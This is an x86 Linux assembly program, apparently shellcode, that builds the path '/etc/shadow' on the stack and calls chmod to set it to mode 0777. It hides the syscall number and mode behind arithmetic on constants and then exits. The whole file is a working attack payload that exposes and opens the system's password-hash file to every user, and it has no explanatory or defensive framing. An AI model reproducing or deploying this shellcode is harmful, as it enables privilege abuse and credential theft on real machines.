global _start

section .text
_start:
	
	mov ecx, 0x68732f63        ; c/sh
	mov eax, 0x74652f2f        ; //et
	mov ebx, 0x776f6461        ; adow

	push edx                   ; NULL
	push ebx                   ; adow
	push ecx                   ; c/sh
	push eax                   ; //et
	mov ebx, esp               ; EBX = /etc/shadow

	sub eax, dword 0x74652f20  ; #define __NR_chmod
	sub ecx, 0x68732D64        ; ECX = 511
	int 0x80                   ; Interruption

	mov al, 0x1                ; #define __NR_exit
	int 0x80                   ; Interruption